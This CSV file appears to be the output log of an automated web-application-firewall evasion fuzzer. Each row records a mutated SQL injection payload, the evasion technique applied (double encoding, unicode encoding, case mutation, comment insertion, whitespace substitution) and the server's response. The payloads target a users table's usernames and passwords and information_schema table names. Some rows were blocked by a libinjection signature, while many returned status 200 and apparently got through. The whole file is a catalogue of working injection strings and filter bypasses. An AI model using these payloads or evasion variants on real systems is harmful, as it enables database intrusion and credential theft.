depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00531,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users  ,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00541,1%2520UNION%2520SELECT%2520USERNAME%252CPASSWORD%2520FROM%2520USERS ,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00484,1%2520union%2520select%2520username%252cpassword%2520from%2520users ,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00568,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4683,0.00492,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00503,1%2520%252555%25254E%252549ON%2520%252553ELEC%252554%2520U%252573%252565%252572NAM%252565%252CPAS%252573WORD%2520%252546,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00532,1%2520%252555%25254e%252549on%2520%252553elec%252554%2520u%252573%252565%252572nam%252565%252cpas%252573word%2520%252546,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.0051,1%252B%252555%25254e%252549ON%2520%252553ELEC%252554%250Au%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546,"1+%55%4e%49ON %53ELEC%54
u%73%65%72nam%65,pas%73word %46RO%4d	u%73ers"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4616,0.00599,"1+%55%4%65%49%4f%4e %53%45LEC%54
u%73%65%72n%61m%65,pas%73word %46RO%4d	u%73ers","1+%55%4e%49ON %53ELEC%54
u%73%65%72nam%65,pas%73word %46RO%4d	u%73ers"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00346,"1+%55%4e%49oN %53eLeC%54
u%73%65%72nAm%65,PaS%73WoRd %46Ro%4D	U%73ErS","1+%55%4e%49ON %53ELEC%54
u%73%65%72nam%65,pas%73word %46RO%4d	u%73ers"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0032,"1+%55%4e%49ON%0a%53ELEC%54
u%73%65%72nam%65,pas%73word	%46RO%4d	u%73ers","1+%55%4e%49ON %53ELEC%54
u%73%65%72nam%65,pas%73word %46RO%4d	u%73ers"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00476,1%2520%252555%25254e%252549oN%2520%252553eLeC%252554%2520u%252573%252565%252572nAm%252565%252CPaS%252573WoRd%2520%252546,"1 %55%4e%49oN %53eLeC%54 u%73%65%72nAm%65,PaS%73WoRd %46Ro%4D U%73ErS"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00317,"1 %55%4e%49%6f%4e %53eL%65%43%54 u%73%65%72nAm%65,Pa%53%73Wo%52d %46R%6f%4D U%73%45rS","1 %55%4e%49oN %53eLeC%54 u%73%65%72nAm%65,PaS%73WoRd %46Ro%4D U%73ErS"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00317,"1 %55%4e%49oN
%53eLeC%54+u%73%65%72nAm%65,PaS%73WoRd+%46Ro%4D U%73ErS","1 %55%4e%49oN %53eLeC%54 u%73%65%72nAm%65,PaS%73WoRd %46Ro%4D U%73ErS"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4632,0.00522,"1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers","1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4633,0.00506,"1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers ","1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4632,0.00577,"1 %55%4%65%49ON %53%45L%45%43%54 U%73%65%72N%61%6D%65,%70%61S%73W%6FR%64 %46%52O%4%64 %75%73ERS","1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4632,0.00637,"1 %55%4%65%49on %53%45l%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52o%4%64 %75%73ers","1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00562,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4607,0.00574,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users ,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00488,1%252BUNION%252509SELECT%250AUSERNAME%252CPASSWORD%2520FROM%2520USERS,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00511,1%252bunion%252509select%250ausername%252cpassword%2520from%2520users,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00553,"1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs","1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4599,0.00556,"1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs ","1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00511,"1+UN/**/ION%09SELECT
USE/**/RNAME,PASSWORD F/**/ROM USE/**/RS","1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00545,"1+un/**/ion%09select
use/**/rname,password f/**/rom use/**/rs","1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00484,1%252BUnIoN%252509SeLeCt%250AuSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS,"1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd fRoM UsErS"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00505,"1+UnIo/**/N%09SeLeCt
uSe/**/RnAmE,PaSsWoRd f/**/RoM U/**/sErS","1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd fRoM UsErS"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00316,"1+U%6e%49%6fN%09S%65%4ce%43t
%75SeR%6eAmE,PaSs%57oRd %66%52o%4d %55s%45%72S","1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd fRoM UsErS"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0033,"1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd%09fRoM%09UsErS","1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd fRoM UsErS"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4702,0.00518,1%252B%252555N%252549%25254fN%252509%252553E%25254cE%252543T%250A%252575s%252565%252572%25256eame%252Cpassw%25256f%25257,"1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d FR%4f%4d us%65r%73"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4634,0.00554,"1+%55N%49%4%66N%09%53E%4cE%43%54
%75%73%65%72%6%65a%6d%65,p%61ss%77%6f%72d %46R%4f%4d u%73%65r%73","1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d FR%4f%4d us%65r%73"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0033,"1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d
FR%4f%4d
us%65r%73","1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d FR%4f%4d us%65r%73"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00425,"1+%55n%49%4fN%09%53e%4Ce%43t
%75S%65%72%6eAmE,PaSsW%6f%72d fR%4f%4D Us%65r%73","1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d FR%4f%4d us%65r%73"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4610,0.00552,1%252BUNION%252509SELECT%250Ausername%252Cpassword%252509FROM%252509users,"1+UNION%09SELECT
username,password%09FROM%09users"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.00506,"1+UNI/**/ON%09SELECT
u/**/sername,password%09FROM%09users","1+UNION%09SELECT
username,password%09FROM%09users"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,"1+U%4e%49ON%09S%45L%45%43T
use%72%6ea%6d%65,%70%61sswo%72%64%09FROM%09users","1+UNION%09SELECT
username,password%09FROM%09users"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00341,"1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd%09fRoM%09UsErS","1+UNION%09SELECT
username,password%09FROM%09users"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00512,1%2520UnIoN%2520SeLeCt%2520uSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS,1%2520UnIoN%2520SeLeCt%2520uSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00552,1%2520UnIoN%2520SeLeCt%2520uSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS ,1%2520UnIoN%2520SeLeCt%2520uSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00513,"1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS","1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4601,0.00538,"1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS ","1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00553,"1 UN/**/ION SE/**/LECT USE/**/RNAME,PASSWORD FR/**/OM US/**/ERS","1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00548,"1 un/**/ion se/**/lect use/**/rname,password fr/**/om us/**/ers","1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4670,0.00514,1%2520U%25256eIo%25254e%2520S%252565LeC%252574%2520u%252553e%252552%25256eAm%252545%252CPaS%252573%252557o%252552d%2520f,"1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00337,"1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fR/**/oM U/**/sErS","1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00518,"1 U%6%65Io%4%65 %53%65%4c%65%43%74 u%53%65%52%6eA%6d%45,P%61S%73%57o%52d %66RoM Us%45r%53","1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00335,"1 U%6eIo%4e
S%65LeC%74%09u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS","1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,"1 U%6eIo%4E S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS","1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00563,1%252BUnIoN%2520SeLeCt%250AuSeRnAmE%252CPaSsWoRd%2520fRoM%252509UsErS,"1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd fRoM%09UsErS"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00516,"1+Un/**/IoN SeLeC/**/t
u/**/SeRnAmE,PaSsWoRd fR/**/oM%09UsErS","1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd fRoM%09UsErS"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00345,"1+%55nI%6f%4e SeLeC%74
%75SeRn%41m%45,%50aS%73Wo%52%64 f%52oM%09%55%73Er%53","1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd fRoM%09UsErS"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.003,"1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd%0afRoM%09UsErS","1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd fRoM%09UsErS"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00514,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4601,0.00584,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs ","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00507,"1 UNIO/**/N SELEC/**/T US/**/ERNAME,PASSWORD FRO/**/M USE/**/RS","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00558,"1 unio/**/n selec/**/t us/**/ername,password fro/**/m use/**/rs","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4602,0.00535,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs  ","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4601,0.00499,"1 UNIO/**/N SELEC/**/T US/**/ERNAME,PASSWORD FRO/**/M USE/**/RS ","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4601,0.00514,"1 unio/**/n selec/**/t us/**/ername,password fro/**/m use/**/rs ","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00498,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4620,0.00613,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables ,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00554,1%2520UNION%2520SELECT%2520TABLE_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.TABLES,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.0056,1%2520union%2520select%2520table_name%252c2%2520from%2520information_schema.tables,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00533,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables  ,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4620,0.00514,1%2520UNION%2520SELECT%2520TABLE_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.TABLES ,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4620,0.0053,1%2520union%2520select%2520table_name%252c2%2520from%2520information_schema.tables ,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.00526,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4740,0.00538,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.00674,1%2520UN%252549%25254FN%2520%252553ELECT%2520%252574A%252562L%252565_%25256EAME%252C2%2520%252546ROM%2520%252569%25256EF,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.00578,1%2520un%252549%25254fn%2520%252553elect%2520%252574a%252562l%252565_%25256eame%252c2%2520%252546rom%2520%252569%25256ef,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4753,0.00542,1%2520UN%252549%25254fN/%252A%252A/%252553ELECT%2509%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM/%252A%252A/%,"1 UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00438,"1 %55%4e%49%4fN/**/%53%45%4c%45CT	%74a%62l%65_%6e%61%6d%65,2 %46%52OM/**/%69%6%65f%6f%72%6da%74%69%6%66n_sc%68e%6d%61.%7","1 UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0033,"1 Un%49%4fN/**/%53ElEcT	%74a%62l%65_%6EaMe,2 %46RoM/**/%69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs","1 UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0034,"1
UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces","1 UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.00517,1%2520Un%252549%25254fN%2520%252553eLeCt%2520%252574A%252562L%252565_%25256eAmE%252C2%2520%252546rOm%2520%252569%25256Ef,"1 Un%49%4fN %53eLeCt %74A%62L%65_%6eAmE,2 %46rOm %69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00356,"1 %55%6e%49%4f%4e %53e%4c%65C%74 %74A%62L%65_%6eA%6dE,2 %46%72O%6d %69%6%45fO%72Ma%74%69%6F%6e_sC%68%45%6d%61.%74a%62%6%","1 Un%49%4fN %53eLeCt %74A%62L%65_%6eAmE,2 %46rOm %69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00346,"1
Un%49%4fN
%53eLeCt
%74A%62L%65_%6eAmE,2/**/%46rOm
%69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs","1 Un%49%4fN %53eLeCt %74A%62L%65_%6eAmE,2 %46rOm %69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4663,0.00543,"1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6","1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4664,0.00515,"1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6","1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4663,0.00499,"1 UN%49%4%66%4E %53ELE%43T %74%61%62%6C%65_%6%65AM%65,2 %46%52%4F%4D %69%6%65FO%72M%61%74%69%6F%6E_SC%68%65%6D%61.%74A%6","1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4663,0.00548,"1 un%49%4%66%4e %53ele%43t %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6","1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6"
